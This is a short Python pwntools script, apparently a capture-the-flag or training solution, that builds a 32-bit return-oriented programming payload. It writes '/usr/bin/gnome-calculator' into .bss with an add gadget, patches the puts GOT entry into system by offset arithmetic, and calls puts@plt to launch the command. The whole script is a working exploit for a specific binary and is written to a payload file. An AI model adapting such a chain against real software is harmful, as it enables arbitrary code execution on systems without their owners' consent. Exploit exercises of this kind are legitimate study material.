from pwn import *

add_what_where = 0x080488fe 	# add dword ptr [eax + 0x5b], ebx ; pop ebp ; ret
pop_eax_ebx_ebp = 0x080488ff 	# pop eax ; pop ebx ; pop ebp ; ret

putsgot = 0x8049CF8
putsoffset = 0x5fca0
systemoffset = 0x3ada0
putsplt = 0x080485E0

bss = 0x8049d68

command = "/usr/bin/gnome-calculator"

rop = []

for i in range(0, len(command), 4):
	current = int(command[i:][:4][::-1].encode("hex"), 16)
	rop += [pop_eax_ebx_ebp, bss + i - 0x5b, current, bss, add_what_where, bss]

rop += [pop_eax_ebx_ebp, putsgot - 0x5b, 0x100000000 - (putsoffset - systemoffset), bss, add_what_where, bss]
rop += [putsplt, bss, bss, bss]

payload = ""
for i in rop:
	payload += p32(i)


with open('rop', 'wb') as f:
	f.write(payload)

print '[+] Generated ROP.\n'
